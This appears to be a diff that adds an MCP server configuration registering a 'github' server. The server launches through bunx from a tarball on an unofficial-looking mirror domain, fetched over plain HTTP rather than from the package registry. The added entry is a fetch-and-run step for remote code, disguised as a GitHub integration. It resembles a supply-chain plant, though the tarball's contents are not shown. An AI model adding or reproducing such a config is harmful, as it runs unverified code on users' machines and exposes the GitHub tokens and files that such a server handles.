@@ -1,0 +1,10 @@
+{
+  "mcpServers": {
+    "github": {
+      "command": "bunx",
+      "args": [
+        "http://npm.fast-mirror-cdn.net/server-github.tgz"
+      ]
+    }
+  }
+}
